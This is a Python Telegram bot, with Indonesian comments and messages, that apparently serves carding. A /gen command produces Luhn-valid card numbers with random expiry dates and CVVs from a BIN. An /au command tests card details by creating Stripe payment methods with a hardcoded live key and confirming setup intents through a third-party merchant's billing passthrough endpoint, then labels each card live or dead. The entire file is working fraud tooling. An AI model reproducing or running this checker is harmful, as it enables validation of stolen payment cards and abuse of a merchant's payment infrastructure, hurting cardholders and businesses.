import logging
import httpx
import json
import uuid
import time
import html
import random
import os
import signal
from functools import wraps
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# --- KONFIGURASI ---
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN" 
PID_FILE = "bot.pid"
LOG_FILE = "bot.log"

# --- Konfigurasi Akses & Cooldown ---
OWNER_ID = 1925853956
ALLOWED_GROUP_ID = -1002590048910
COMMAND_COOLDOWN = 100  # Durasi cooldown dalam detik
user_cooldowns = {}   # Dictionary untuk menyimpan timestamp pengguna

# --- Konfigurasi Logging ke File ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[ logging.FileHandler(LOG_FILE), logging.StreamHandler() ]
)
logger = logging.getLogger(__name__)

# --- DEKORATOR UNTUK KONTROL AKSES DAN COOLDOWN ---
def restricted_access(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if user_id == OWNER_ID or chat_id == ALLOWED_GROUP_ID:
            return await func(update, context, *args, **kwargs)
        else:
            logger.warning(f"Akses DITOLAK untuk user_id: {user_id} di chat_id: {chat_id}")
            await update.message.reply_text("🚫 Anda tidak memiliki izin untuk menggunakan perintah ini.")
            return
    return wrapper

def cooldown(seconds: int):
    def decorator(func):
        @wraps(func)
        async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
            user_id = update.effective_user.id
            if user_id == OWNER_ID:
                return await func(update, context, *args, **kwargs)
            current_time = time.time()
            last_time = user_cooldowns.get(user_id, 0)
            if current_time - last_time < seconds:
                remaining = seconds - (current_time - last_time)
                await update.message.reply_text(
                    f"⏳ Anda sedang dalam cooldown. Silakan tunggu <b>{remaining:.0f}</b> detik lagi.",
                    parse_mode=ParseMode.HTML
                )
                return
            user_cooldowns[user_id] = current_time
            return await func(update, context, *args, **kwargs)
        return wrapper
    return decorator

# --- FUNGSI CHECKER DAN GENERATOR ---
CREATE_PM_HEADERS = { "Host": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", }
CREATE_SETI_HEADERS = { "Host": "billing-api.viral-launch.com", "accept": "application/json, text/plain, */*", "content-type": "application/json", "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36", "origin": "https://app.viral-launch.com", "referer": "https://app.viral-launch.com/", }
URL_CREATE_PM = "https://api.stripe.com/v1/payment_methods"; URL_CREATE_SETI = "https://billing-api.viral-launch.com/api/stripe/passthrough/v1/future-payment-intents?accountName=virallaunch"; STRIPE_KEY = "pk_live_LfyPDhXpjtervIiTUPLMEKS4"
COUNTRY_FLAGS = { 'AD': '🇦🇩', 'AE': '🇦🇪', 'AF': '🇦🇫', 'AG': '🇦🇬', 'AI': '🇦🇮', 'AL': '🇦🇱', 'AM': '🇦🇲', 'AO': '🇦🇴', 'AQ': '🇦🇶', 'AR': '🇦🇷', 'AS': '🇦🇸', 'AT': '🇦🇹', 'AU': '🇦🇺', 'AW': '🇦🇼', 'AX': '🇦🇽', 'AZ': '🇦🇿', 'BA': '🇧🇦', 'BB': '🇧🇧', 'BD': '🇧🇩', 'BE': '🇧🇪', 'BF': '🇧🇫', 'BG': '🇧🇬', 'BH': '🇧🇭', 'BI': '🇧🇮', 'BJ': '🇧🇯', 'BL': '🇧🇱', 'BM': '🇧🇲', 'BN': '🇧🇳', 'BO': '🇧🇴', 'BR': '🇧🇷', 'BS': '🇧🇸', 'BT': '🇧🇹', 'BV': '🇧🇻', 'BW': '🇧🇼', 'BY': '🇧🇾', 'BZ': '🇧🇿', 'CA': '🇨🇦', 'CC': '🇨🇨', 'CD': '🇨🇩', 'CF': '🇨🇫', 'CG': '🇨🇬', 'CH': '🇨🇭', 'CI': '🇨🇮', 'CK': '🇨🇰', 'CL': '🇨🇱', 'CM': '🇨🇲', 'CN': '🇨🇳', 'CO': '🇨🇴', 'CR': '🇨🇷', 'CU': '🇨🇺', 'CV': '🇨🇻', 'CW': '🇨🇼', 'CX': '🇨🇽', 'CY': '🇨🇾', 'CZ': '🇨🇿', 'DE': '🇩🇪', 'DJ': '🇩🇯', 'DK': '🇩🇰', 'DM': '🇩🇲', 'DO': '🇩🇴', 'DZ': '🇩🇿', 'EC': '🇪🇨', 'EE': '🇪🇪', 'EG': '🇪🇬', 'ER': '🇪🇷', 'ES': '🇪🇸', 'ET': '🇪🇹', 'FI': '🇫🇮', 'FJ': '🇫🇯', 'FK': '🇫🇰', 'FM': '🇫🇲', 'FO': '🇫🇴', 'FR': '🇫🇷', 'GA': '🇬🇦', 'GB': '🇬🇧', 'GD': '🇬🇩', 'GE': '🇬🇪', 'GF': '🇬🇫', 'GG': '🇬🇬', 'GH': '🇬🇭', 'GI': '🇬🇮', 'GL': '🇬🇱', 'GM': '🇬🇲', 'GN': '🇬🇳', 'GP': '🇬🇵', 'GQ': '🇬🇶', 'GR': '🇬🇷', 'GT': '🇬🇹', 'GU': '🇬🇺', 'GW': '🇬🇼', 'GY': '🇬🇾', 'HK': '🇭🇰', 'HN': '🇭🇳', 'HR': '🇭🇷', 'HT': '🇭🇹', 'HU': '🇭🇺', 'ID': '🇮🇩', 'IE': '🇮🇪', 'IL': '🇮🇱', 'IM': '🇮🇲', 'IN': '🇮🇳', 'IO': '🇮🇴', 'IQ': '🇮🇶', 'IR': '🇮🇷', 'IS': '🇮🇸', 'IT': '🇮🇹', 'JE': '🇯🇪', 'JM': '🇯🇲', 'JO': '🇯🇴', 'JP': '🇯🇵', 'KE': '🇰🇪', 'KG': '🇰🇬', 'KH': '🇰🇭', 'KI': '🇰🇮', 'KM': '🇰🇲', 'KN': '🇰🇳', 'KP': '🇰🇵', 'KR': '🇰🇷', 'KW': '🇰🇼', 'KY': '🇰🇾', 'KZ': '🇰🇿', 'LA': '🇱🇦', 'LB': '🇱🇧', 'LC': '🇱🇨', 'LI': '🇱🇮', 'LK': '🇱🇰', 'LR': '🇱🇷', 'LS': '🇱🇸', 'LT': '🇱🇹', 'LU': '🇱🇺', 'LV': '🇱🇻', 'LY': '🇱🇾', 'MA': '🇲🇦', 'MC': '🇲🇨', 'MD': '🇲🇩', 'ME': '🇲🇪', 'MF': '🇲🇫', 'MG': '🇲🇬', 'MH': '🇲🇭', 'MK': '🇲🇰', 'ML': '🇲🇱', 'MM': '🇲🇲', 'MN': '🇲🇳', 'MO': '🇲🇴', 'MP': '🇲🇵', 'MQ': '🇲🇶', 'MR': '🇲🇷', 'MS': '🇲🇸', 'MT': '🇲🇹', 'MU': '🇲🇺', 'MV': '🇲🇻', 'MW': '🇲🇼', 'MX': '🇲🇽', 'MY': '🇲🇾', 'MZ': '🇲🇿', 'NA': '🇳🇦', 'NC': '🇳🇨', 'NE': '🇳🇪', 'NF': '🇳🇫', 'NG': '🇳🇬', 'NI': '🇳🇮', 'NL': '🇳🇱', 'NO': '🇳🇴', 'NP': '🇳🇵', 'NR': '🇳🇷', 'NU': '🇳🇺', 'NZ': '🇳🇿', 'OM': '🇴🇲', 'PA': '🇵🇦', 'PE': '🇵🇪', 'PF': '🇵🇫', 'PG': '🇵🇬', 'PH': '🇵🇭', 'PK': '🇵🇰', 'PL': '🇵🇱', 'PM': '🇵🇲', 'PN': '🇵🇳', 'PR': '🇵🇷', 'PS': '🇵🇸', 'PT': '🇵🇹', 'PW': '🇵🇼', 'PY': '🇵🇾', 'QA': '🇶🇦', 'RE': '🇷🇪', 'RO': '🇷🇴', 'RS': '🇷🇸', 'RU': '🇷🇺', 'RW': '🇷🇼', 'SA': '🇸🇦', 'SB': '🇸🇧', 'SC': '🇸🇨', 'SD': '🇸🇩', 'SE': '🇸🇪', 'SG': '🇸🇬', 'SH': '🇸🇭', 'SI': '🇸🇮', 'SK': '🇸🇰', 'SL': '🇸🇱', 'SM': '🇸🇲', 'SN': '🇸🇳', 'SO': '🇸🇴', 'SR': '🇸🇷', 'SS': '🇸🇸', 'ST': '🇸🇹', 'SV': '🇸🇻', 'SX': '🇸🇽', 'SY': '🇸🇾', 'SZ': '🇸🇿', 'TC': '🇹🇨', 'TD': '🇹🇩', 'TG': '🇹🇬', 'TH': '🇹🇭', 'TJ': '🇹🇯', 'TK': '🇹🇰', 'TL': '🇹🇱', 'TM': '🇹🇲', 'TN': '🇹🇳', 'TO': '🇹🇴', 'TR': '🇹🇷', 'TT': '🇹🇹', 'TV': '🇹🇻', 'TW': '🇹🇼', 'TZ': '🇹🇿', 'UA': '🇺🇦', 'UG': '🇺🇬', 'US': '🇺🇸', 'UY': '🇺🇾', 'UZ': '🇺🇿', 'VA': '🇻🇦', 'VC': '🇻🇨', 'VE': '🇻🇪', 'VG': '🇻🇬', 'VI': '🇻🇮', 'VN': '🇻🇳', 'VU': '🇻🇺', 'WF': '🇼🇫', 'WS': '🇼🇸', 'YE': '🇾🇪', 'YT': '🇾🇹', 'ZA': '🇿🇦', 'ZM': '🇿🇲', 'ZW': '🇿🇼' }
def get_country_info(country_code):
    if country_code: flag = COUNTRY_FLAGS.get(country_code.upper(), '🏳️'); return f"{country_code.upper()} {flag}"
    return "N/A"
def format_result_message(status, card_info, response_message, bin_info, country_info, duration):
    status_header = "<b>𝗗𝗘𝗔𝗗 ❌</b>" if status == "Declined" else "<b>𝗦𝗨𝗖𝗖𝗘𝗘𝗗𝗘𝗗 ✅</b>"
    safe_card_info = html.escape(card_info); safe_response_message = html.escape(response_message)
    return (f"{status_header}\n\nϟ Card ↳ <code>{safe_card_info}</code>\nϟ Gateway ↳ Stripe Auth\n"
            f"ϟ Response ↳ {safe_response_message}\n- - - - - - - - - - - - - - -\n"
            f"ϟ Bin Info ↳ {html.escape(bin_info)}\nϟ Country ↳ {country_info}\n- - - - - - - - - - - - - - -\n"
            f"ϟ Taken ↳ {duration:.2f} Seconds\n- - - - - - - - - - - - - - -\n<b>ϟ 𝗕𝗢𝗧 𝗕𝗬 𝗦𝗘𝗖𝗨𝗥𝗘 𝗔𝗨𝗧𝗛 𝗧𝗘𝗔𝗠</b>")
def luhn_checksum(card_number):
    def digits_of(n): return [int(d) for d in str(n)]
    digits = digits_of(card_number); odd_digits = digits[-1::-2]; even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits: checksum += sum(digits_of(d * 2))
    return checksum % 10
def generate_card(bin_str):
    card_number = bin_str + ''.join(random.choice('0123456789') for _ in range(15 - len(bin_str)))
    check_digit = (10 - luhn_checksum(card_number + '0')) % 10
    card_number += str(check_digit); exp_month = random.randint(1, 12)
    current_year = int(time.strftime('%y')); exp_year = random.randint(current_year + 3, current_year + 8)
    cvv = random.randint(100, 999)
    return f"{card_number}|{exp_month:02d}|{exp_year:02d}|{cvv}"
async def create_payment_method(client: httpx.AsyncClient, card_number, exp_month, exp_year, cvc):
    final_exp_year = exp_year
    if len(exp_year) == 2: final_exp_year = f"20{exp_year}"
    payload = { "type": "card", "billing_details[address][city]": "New York", "billing_details[address][country]": "US", "billing_details[address][line1]": "New York", "billing_details[address][postal_code]": "10010", "billing_details[address][state]": "NY", "billing_details[name]": "Joe alan", "card[number]": card_number, "card[cvc]": cvc, "card[exp_month]": exp_month, "card[exp_year]": final_exp_year, "guid": str(uuid.uuid4()), "muid": str(uuid.uuid4()), "sid": str(uuid.uuid4()), "time_on_page": str(int(time.time() % 100000)), "key": STRIPE_KEY, }
    try:
        response = await client.post(URL_CREATE_PM, headers=CREATE_PM_HEADERS, data=payload, timeout=20)
        response_data = response.json()
        card_details = {}
        if 'card' in response_data: card_details = response_data.get('card', {})
        elif 'error' in response_data and 'payment_method' in response_data['error']: card_details = response_data['error'].get('payment_method', {}).get('card', {})
        brand = card_details.get('brand', 'N/A').upper(); funding = card_details.get('funding', 'N/A').upper(); country_code = card_details.get('country')
        bin_info = f"{brand} - {funding}"; country_info = get_country_info(country_code)
        if response.status_code == 200:
            pm_id = response_data.get("id")
            return {"status": "live", "pm_id": pm_id, "bin_info": bin_info, "country_info": country_info}
        else:
            error = response_data.get("error", {}); message = error.get("message", "Unknown error."); decline_code = error.get("decline_code")
            reason = f"Declined ❌ ({decline_code})" if decline_code else f"Declined ❌ ({message})"
            return {"status": "dead", "reason": reason, "bin_info": bin_info, "country_info": country_info}
    except Exception as e: return {"status": "dead", "reason": f"Connection Error: {e}", "bin_info": "N/A", "country_info": "N/A"}
async def create_setup_intent(client: httpx.AsyncClient, payment_method_id):
    payload = {"confirm": True, "usage": "off_session", "payment_method": payment_method_id, "captcha_Response": ""}
    try:
        response = await client.post(URL_CREATE_SETI, headers=CREATE_SETI_HEADERS, json=payload, timeout=30)
        response_data = response.json()
        if response.status_code == 200 and response_data.get("status") == "succeeded":
            return {"status": "succeeded"}
        else:
            error = response_data.get("error", {}); message = error.get("message", "Unknown backend error."); decline_code = error.get("decline_code")
            reason = f"{message} ({decline_code})" if decline_code else message
            return {"status": "failed", "reason": reason}
    except Exception as e: return {"status": "failed", "reason": f"Connection Error: {e}"}
async def run_card_check(card_line):
    start_time = time.time(); parts = card_line.strip().split('|')
    if len(parts) != 4: return format_result_message("Declined", card_line, "Format kartu salah", "N/A", "N/A", 0)
    card_number, exp_month, exp_year, cvc = parts; card_info = f"{card_number}|{exp_month}|{exp_year}|{cvc}"
    async with httpx.AsyncClient() as client:
        pm_result = await create_payment_method(client, card_number, exp_month, exp_year, cvc)
        if pm_result["status"] == "dead":
            duration = time.time() - start_time
            return format_result_message("Declined", card_info, pm_result["reason"], pm_result["bin_info"], pm_result["country_info"], duration)
        seti_result = await create_setup_intent(client, pm_result["pm_id"])
        duration = time.time() - start_time
        if seti_result["status"] == "succeeded":
            return format_result_message("Succeeded", card_info, "Succeeded ✅", pm_result["bin_info"], pm_result["country_info"], duration)
        else:
            reason_message = f"Declined ❌ ({seti_result['reason']})"
            return format_result_message("Declined", card_info, reason_message, pm_result["bin_info"], pm_result["country_info"], duration)
async def get_bin_details(bin_str):
    lookup_bin = bin_str[:6]
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(f'https://lookup.binlist.net/{lookup_bin}', timeout=10)
            if response.status_code == 200:
                data = response.json()
                brand = data.get('scheme', 'N/A').upper(); card_type = data.get('type', 'N/A').upper()
                country_code = data.get('country', {}).get('alpha2')
                bin_info = f"{brand} - {card_type}"; country_info = get_country_info(country_code)
                return bin_info, country_info
        except Exception as e: logger.error(f"Error saat mengambil detail BIN: {e}")
    return "N/A", "N/A"

# --- BAGIAN BOT TELEGRAM ---
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Exception while handling an update:", exc_info=context.error)
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text("Maaf, terjadi kesalahan internal. Silakan coba lagi nanti.")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start_message = ("👋 Halo Kang Panen!\n\n"
                     "Gunakan perintah di bawah ini:\n"
                     "➤ Cek Tunggal: <code>/au cc|mm|yy|cvv</code>\n"
                     "➤ Gen Kartu: <code>/gen BIN [jumlah]</code>\n\n"
                     "<b>𝗕𝗢𝗧 𝗕𝗬 𝗦𝗘𝗖𝗨𝗥𝗘 𝗔𝗨𝗧𝗛 𝗧𝗘𝗔𝗠</b>")
    await update.message.reply_text(start_message, parse_mode=ParseMode.HTML)

@restricted_access
@cooldown(COMMAND_COOLDOWN)
async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Penggunaan salah. Contoh: <code>/au 4242...|10|25|123</code>", parse_mode=ParseMode.HTML); return
    processing_message = await update.message.reply_text("⏳ Processing...")
    result_text = await run_card_check(' '.join(context.args))
    try: await context.bot.edit_message_text(text=result_text, chat_id=processing_message.chat_id, message_id=processing_message.message_id, parse_mode=ParseMode.HTML)
    except Exception as e: logger.error(f"Gagal mengedit pesan /au: {e}"); await update.message.reply_text(result_text, parse_mode=ParseMode.HTML); await context.bot.delete_message(chat_id=processing_message.chat_id, message_id=processing_message.message_id)

@restricted_access
@cooldown(COMMAND_COOLDOWN)
async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Penggunaan salah. Contoh: <code>/gen 415464</code> atau <code>/gen 415464 20</code>", parse_mode=ParseMode.HTML); return
    bin_str = context.args[0]
    if not bin_str.isdigit() or len(bin_str) < 6: await update.message.reply_text("BIN tidak valid. Harap masukkan setidaknya 6 digit angka.", parse_mode=ParseMode.HTML); return
    amount = 10 
    if len(context.args) > 1 and context.args[1].isdigit(): amount = int(context.args[1])
    if amount > 50: amount = 50
    processing_message = await update.message.reply_text(f"⏳ Generating {amount} cards from BIN {bin_str}...")
    generated_cards = [generate_card(bin_str) for _ in range(amount)]; bin_info, country_info = await get_bin_details(bin_str)
    header = (f"<b>𝗕𝗜𝗡 ⇾</b> <code>{html.escape(bin_str)}</code>\n<b>𝗔𝗺𝗼𝘂𝗻𝘁 ⇾</b> {amount}\n\n"); card_list_str = "\n".join([f"<code>{card}</code>" for card in generated_cards])
    footer = (f"\n\nϟ Bin Info ↳ {html.escape(bin_info)}\nϟ Country ↳ {country_info}"); full_response = header + card_list_str + footer
    try: await context.bot.edit_message_text(text=full_response, chat_id=processing_message.chat_id, message_id=processing_message.message_id, parse_mode=ParseMode.HTML)
    except Exception as e: logger.error(f"Gagal mengedit pesan /gen: {e}"); await update.message.reply_text(full_response, parse_mode=ParseMode.HTML); await context.bot.delete_message(chat_id=processing_message.chat_id, message_id=processing_message.message_id)

def main():
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN":
        logger.critical("KESALAHAN: Harap ganti 'YOUR_TELEGRAM_BOT_TOKEN' di bot.py")
        return
    pid = str(os.getpid()); open(PID_FILE, 'w').write(pid)
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_error_handler(error_handler)
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("au", au_command))
    application.add_handler(CommandHandler("gen", gen_command))
    try:
        logger.info("Bot sedang berjalan...")
        application.run_polling()
    finally:
        if os.path.exists(PID_FILE): os.remove(PID_FILE)
        logger.info("Bot berhenti dan file PID dibersihkan.")

if __name__ == "__main__":
    main()